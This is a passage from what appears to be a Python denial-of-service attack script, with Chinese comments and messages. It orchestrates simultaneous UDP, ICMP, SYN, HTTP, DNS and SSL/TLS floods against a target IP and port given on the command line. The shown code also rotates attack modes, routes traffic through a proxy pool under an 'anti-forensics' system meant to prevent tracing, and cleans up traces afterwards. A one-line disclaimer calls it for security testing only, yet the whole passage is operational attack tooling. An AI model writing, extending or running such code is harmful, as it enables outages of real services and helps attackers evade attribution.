            print(f"[+] 启动UDP洪水攻击 ({concurrency}并发)...")
            tasks.append(asyncio.create_task(
                udp_flood_async(ip, port, speed, concurrency, anti_forensics)
            ))
        elif mode == "icmp":
            print(f"[+] 启动ICMP死亡Ping ({concurrency}并发)...")
            tasks.append(asyncio.create_task(
                icmp_flood_async(ip, speed, concurrency, anti_forensics)
            ))
        elif mode == "syn":
            print(f"[+] 启动SYN洪水攻击 ({concurrency}并发)...")
            tasks.append(asyncio.create_task(
                syn_flood_async(ip, port, speed, concurrency, anti_forensics)
            ))
        elif mode == "http":
            print(f"[+] 启动HTTP洪水攻击 ({concurrency}并发)...")
            tasks.append(asyncio.create_task(
                http_flood_async(ip, port, speed, concurrency, anti_forensics)
            ))
        elif mode == "dns":
            print(f"[+] 启动DNS洪水攻击 ({concurrency}并发)...")
            tasks.append(asyncio.create_task(
                dns_flood_async(ip, speed, concurrency, anti_forensics)
            ))
        elif mode == "ssl_tls":
            print(f"[+] 启动SSL/TLS洪水攻击 ({concurrency}并发)...")
            tasks.append(asyncio.create_task(
                ssl_tls_flood_async(ip, port, speed, concurrency, anti_forensics)
            ))
    
    # 定期检查并切换攻击模式
    async def mode_switcher():
        while True:
            await asyncio.sleep(DYNAMIC_MODE_CONFIG["interval"])
            
            # 获取新的攻击模式
            new_modes = anti_forensics.select_attack_modes()
            
            # 如果模式有变化，取消旧任务并创建新任务
            if set(new_modes) != set(current_modes):
                print(f"[攻击控制] 检测到攻击模式变化，正在切换...")
                
                # 取消旧任务
                for task in tasks:
                    task.cancel()
                
                # 等待任务取消完成
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # 清空任务列表
                tasks.clear()
                
                # 创建新任务
                for mode in new_modes:
                    if mode == "udp":
                        print(f"[+] 启动UDP洪水攻击 ({concurrency}并发)...")
                        tasks.append(asyncio.create_task(
                            udp_flood_async(ip, port, speed, concurrency, anti_forensics)
                        ))
                    elif mode == "icmp":
                        print(f"[+] 启动ICMP死亡Ping ({concurrency}并发)...")
                        tasks.append(asyncio.create_task(
                            icmp_flood_async(ip, speed, concurrency, anti_forensics)
                        ))
                    elif mode == "syn":
                        print(f"[+] 启动SYN洪水攻击 ({concurrency}并发)...")
                        tasks.append(asyncio.create_task(
                            syn_flood_async(ip, port, speed, concurrency, anti_forensics)
                        ))
                    elif mode == "http":
                        print(f"[+] 启动HTTP洪水攻击 ({concurrency}并发)...")
                        tasks.append(asyncio.create_task(
                            http_flood_async(ip, port, speed, concurrency, anti_forensics)
                        ))
                    elif mode == "dns":
                        print(f"[+] 启动DNS洪水攻击 ({concurrency}并发)...")
                        tasks.append(asyncio.create_task(
                            dns_flood_async(ip, speed, concurrency, anti_forensics)
                        ))
                    elif mode == "ssl_tls":
                        print(f"[+] 启动SSL/TLS洪水攻击 ({concurrency}并发)...")
                        tasks.append(asyncio.create_task(
                            ssl_tls_flood_async(ip, port, speed, concurrency, anti_forensics)
                        ))
                
                # 更新当前模式
                current_modes = new_modes
    
    # 启动模式切换器
    mode_switcher_task = asyncio.create_task(mode_switcher())
    
    # 运行所有任务
    try:
        await asyncio.gather(*tasks, mode_switcher_task)
    except asyncio.CancelledError:
        print("攻击被取消！")
    except Exception as e:
        print(f"攻击过程中发生错误: {e}")


async def main():
    print("🔒 高级反溯源混合攻击系统启动！")
    print("⚠️  警告：仅供安全测试使用！")

    parser = argparse.ArgumentParser(description="反溯源混合攻击脚本")
    parser.add_argument("-ip", required=True, help="目标IP地址")
    parser.add_argument("-port", type=int, default=80, help="目标端口")
    parser.add_argument("-speed", type=int, default=500, help="攻击速度 (1-1000)")
    parser.add_argument("-concurrency", type=int, default=100, help="并发连接数")
    parser.add_argument("--anti-forensics", choices=["low", "medium", "high", "paranoid"],
                        default="medium", help="反溯源安全级别")
    parser.add_argument("--dynamic-mode", action="store_true", help="启用动态攻击模式切换")

    args = parser.parse_args()

    # 初始化反溯源系统
    anti_forensics = AIAntiForensics(security_level=args.anti_forensics)
    
    # 输出代理池统计信息
    stats = anti_forensics.proxy_pool.get_proxy_stats()
    print(f"[代理池] 初始状态: {stats}")

    # 启动攻击
    if args.dynamic_mode:
        print("启用动态攻击模式切换")
        await dynamic_attack_controller(
            args.ip, args.port, args.speed, args.concurrency, anti_forensics
        )
    else:
        # 启动所有攻击
        tasks = []

        print(f"[+] 启动UDP洪水攻击 ({args.concurrency}并发)...")
        tasks.append(asyncio.create_task(
            udp_flood_async(args.ip, args.port, args.speed, args.concurrency, anti_forensics)
        ))

        print(f"[+] 启动ICMP死亡Ping ({args.concurrency}并发)...")
        tasks.append(asyncio.create_task(
            icmp_flood_async(args.ip, args.speed, args.concurrency, anti_forensics)
        ))

        print(f"[+] 启动SYN洪水攻击 ({args.concurrency}并发)...")
        tasks.append(asyncio.create_task(
            syn_flood_async(args.ip, args.port, args.speed, args.concurrency, anti_forensics)
        ))

        print(f"[+] 启动HTTP洪水攻击 ({args.concurrency}并发)...")
        tasks.append(asyncio.create_task(
            http_flood_async(args.ip, args.port, args.speed, args.concurrency, anti_forensics)
        ))
        
        print(f"[+] 启动DNS洪水攻击 ({args.concurrency}并发)...")
        tasks.append(asyncio.create_task(
            dns_flood_async(args.ip, args.speed, args.concurrency, anti_forensics)
        ))
        
        print(f"[+] 启动SSL/TLS洪水攻击 ({args.concurrency}并发)...")
        tasks.append(asyncio.create_task(
            ssl_tls_flood_async(args.ip, args.port, args.speed, args.concurrency, anti_forensics)
        ))

        print("所有攻击已启动！按Ctrl+C停止")
        print(f"反溯源级别: {args.anti_forensics.upper()}")

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            print("攻击被取消！")
        except KeyboardInterrupt:
            print("用户中断攻击！")
        finally:
            # 清理痕迹
            anti_forensics.cleanup()
            
            # 输出代理池统计信息
            stats = anti_forensics.proxy_pool.get_proxy_stats()
            print(f"[代理池] 最终状态: {stats}")
            
            print("反溯源清理完成")


if __name__ == "__main__":
    # 提升资源限制
    try:
        import resource

        resource.setrlimit(resource.RLIMIT_NOFILE, (10000, 10000))
    except:
        pass

    # 检查依赖
    try:
        import cryptography
        import bs4
    except ImportError:
        print("请安装依赖: pip install cryptography aiohttp scapy beautifulsoup4")
        sys.exit(1)

    # 启动攻击
    asyncio.run(main())